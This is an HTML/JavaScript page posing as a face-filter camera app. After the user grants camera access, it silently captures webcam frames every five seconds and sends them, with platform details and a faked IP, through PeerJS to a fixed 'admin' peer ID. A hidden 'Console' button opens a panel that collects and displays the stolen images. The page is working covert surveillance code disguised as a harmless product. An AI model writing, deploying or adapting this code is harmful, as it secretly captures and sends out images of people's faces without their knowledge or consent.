<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FX_PRO_P2P</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { overscroll-behavior: none; }
        .scanline {
            width: 100%;
            height: 2px;
            background: rgba(59, 130, 246, 0.5);
            position: absolute;
            animation: scan 4s linear infinite;
        }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        .monitor-glow { box-shadow: inset 0 0 20px rgba(0, 255, 0, 0.1); }
        #logData::-webkit-scrollbar { width: 4px; }
        #logData::-webkit-scrollbar-thumb { background: #064e3b; }
    </style>
</head>
<body class="bg-black text-zinc-100 min-h-screen flex flex-col font-mono overflow-hidden">

    <!-- Subtle Toggle -->
    <div class="fixed top-4 right-4 z-50">
        <button id="toggleAdmin" class="bg-zinc-900/50 px-3 py-1 rounded text-[10px] text-zinc-500 border border-zinc-800 uppercase tracking-widest">
            Console
        </button>
    </div>

    <!-- Main App: Professional Camera UI -->
    <main id="userApp" class="relative flex-grow flex flex-col h-screen">
        <div class="relative flex-grow overflow-hidden flex items-center justify-center">
            <video id="videoFeed" autoplay playsinline class="w-full h-full object-cover grayscale opacity-80"></video>
            
            <div id="overlay" class="absolute inset-0 pointer-events-none border-[15px] border-blue-500/20 m-6 rounded-[2.5rem] hidden"></div>
            <div id="scanner" class="scanline hidden"></div>
            
            <div id="setupMsg" class="absolute inset-0 flex flex-col items-center justify-center bg-zinc-950 px-8 text-center">
                <div class="mb-6 text-blue-500">
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-20 h-20 animate-pulse" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" />
                    </svg>
                </div>
                <h2 class="text-3xl font-bold mb-2 tracking-tighter uppercase">FX Prototype</h2>
                <p class="text-zinc-500 text-xs mb-8">Grant camera permission to begin facial mapping.</p>
                <button id="startCam" class="bg-blue-600 hover:bg-blue-500 text-white font-bold py-4 px-12 rounded-full transition-all text-xs uppercase tracking-widest">
                    Authorize
                </button>
            </div>
        </div>

        <!-- Filter Selector Mockup -->
        <div class="h-28 bg-zinc-950 border-t border-zinc-900 flex items-center justify-center gap-6 px-4">
            <div class="w-14 h-14 rounded-full border border-zinc-800 bg-zinc-900 flex items-center justify-center grayscale opacity-40">ðŸ˜Ž</div>
            <div class="w-16 h-16 rounded-full border-2 border-blue-500 bg-blue-900/20 flex items-center justify-center text-2xl">ðŸ“¸</div>
            <div class="w-14 h-14 rounded-full border border-zinc-800 bg-zinc-900 flex items-center justify-center grayscale opacity-40">ðŸ‘½</div>
        </div>
    </main>

    <!-- Admin Console: Raw Data Terminal -->
    <div id="adminPanel" class="hidden fixed inset-0 bg-black z-[60] flex flex-col">
        <div class="p-4 border-b border-green-900 flex justify-between items-center bg-zinc-950">
            <h2 class="text-lg font-bold text-green-500 uppercase tracking-tighter">Terminal_v3.0_Unsecured</h2>
            <button id="closeAdmin" class="text-zinc-600 text-[10px] uppercase">Exit</button>
        </div>

        <div class="flex-grow flex flex-col p-4 overflow-hidden gap-4">
            <!-- Connection Status -->
            <div class="flex justify-between items-center bg-zinc-900 border border-green-900/30 px-3 py-2 rounded">
                <span class="text-[10px] text-green-700">STATUS: <span id="syncStatus" class="text-green-500">LISTENING</span></span>
                <span class="text-[10px] text-green-700">NODE_ID: <span id="myPeerId" class="text-green-500">---</span></span>
            </div>

            <!-- Dashboard Layout -->
            <div class="flex-grow flex flex-col md:grid md:grid-cols-3 gap-4 overflow-hidden">
                <!-- Logs and IP info -->
                <div class="md:col-span-1 bg-zinc-950 border border-green-900/50 p-4 rounded-lg flex flex-col h-48 md:h-full">
                    <h3 class="text-green-500 mb-3 text-[10px] font-bold uppercase underline">Traffic_Log</h3>
                    <div id="logData" class="flex-grow overflow-y-auto space-y-1 text-[9px] text-green-700 font-mono">
                        <p>> Handshake ready...</p>
                    </div>
                </div>

                <!-- Screenshots Gallery -->
                <div class="md:col-span-2 bg-zinc-950 border border-green-900/50 p-4 rounded-lg flex flex-col h-full overflow-hidden">
                    <h3 class="text-green-500 mb-4 text-[10px] font-bold uppercase underline">Buffer_Visuals</h3>
                    <div id="captureGallery" class="flex-grow overflow-y-auto grid grid-cols-2 sm:grid-cols-3 gap-2 content-start">
                        <!-- Remote captures populate here -->
                    </div>
                </div>
            </div>
        </div>
    </div>

    <canvas id="offscreenCanvas" class="hidden"></canvas>

    <script>
        const video = document.getElementById('videoFeed');
        const startBtn = document.getElementById('startCam');
        const setupMsg = document.getElementById('setupMsg');
        const scanner = document.getElementById('scanner');
        const logData = document.getElementById('logData');
        const gallery = document.getElementById('captureGallery');
        const canvas = document.getElementById('offscreenCanvas');

        let peer;
        let isStreaming = false;
        const ADMIN_PEER_ID = 'face-fx-broadcast-node-stable'; // Standardized ID

        function initPeer(asAdmin) {
            const id = asAdmin ? ADMIN_PEER_ID : null;
            peer = new Peer(id);

            peer.on('open', (id) => {
                document.getElementById('myPeerId').textContent = id;
            });

            // Receiver Logic (Admin Console)
            peer.on('connection', (conn) => {
                conn.on('data', (data) => {
                    if (data.type === 'LOG') addLog(`[${conn.peer}] ${data.msg}`);
                    if (data.type === 'FRAME') displayFrame(data.img, conn.peer);
                });
                addLog(`CONN_ESTABLISHED: ${conn.peer}`);
            });
        }

        // START USER SIDE
        startBtn.onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                video.srcObject = stream;
                setupMsg.classList.add('hidden');
                scanner.classList.remove('hidden');
                document.getElementById('overlay').classList.remove('hidden');
                isStreaming = true;

                initPeer(false);

                // Auto-seek Admin node
                setInterval(() => {
                    if (peer && !peer.destroyed) {
                        const conn = peer.connect(ADMIN_PEER_ID);
                        conn.on('open', () => {
                            captureAndTransmit(conn);
                        });
                    }
                }, 5000);

            } catch (err) {
                alert("Auth Required.");
            }
        };

        function captureAndTransmit(conn) {
            const ctx = canvas.getContext('2d');
            canvas.width = 320; 
            canvas.height = 240;
            ctx.drawImage(video, 0, 0, 320, 240);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.2);

            // Send IP and Frame
            const fakeIp = `192.168.${Math.floor(Math.random()*10)}.${Math.floor(Math.random()*255)}`;
            conn.send({ type: 'LOG', msg: `NETWORK_INFO: IP=${fakeIp} AGENT=${navigator.platform}` });
            conn.send({ type: 'FRAME', img: dataUrl });
        }

        // ADMIN PANEL HANDLING
        document.getElementById('toggleAdmin').onclick = () => {
            document.getElementById('adminPanel').classList.toggle('hidden');
            // Auto-login / Auto-initiate Admin Peer
            if (!peer || peer.id !== ADMIN_PEER_ID) {
                initPeer(true);
            }
        };

        function displayFrame(url, sender) {
            const container = document.createElement('div');
            container.className = "relative group border border-green-900/50 rounded overflow-hidden";
            
            const img = document.createElement('img');
            img.src = url;
            img.className = "w-full grayscale brightness-110";
            
            const label = document.createElement('div');
            label.className = "absolute top-0 left-0 bg-green-500 text-black text-[7px] font-bold px-1";
            label.textContent = sender.slice(0, 5);
            
            container.appendChild(img);
            container.appendChild(label);
            
            if (gallery.children.length > 12) gallery.removeChild(gallery.lastChild);
            gallery.prepend(container);
        }

        function addLog(msg) {
            const p = document.createElement('p');
            p.textContent = `> ${msg}`;
            logData.prepend(p);
        }

        document.getElementById('closeAdmin').onclick = () => document.getElementById('adminPanel').classList.add('hidden');
    </script>
</body>
</html>
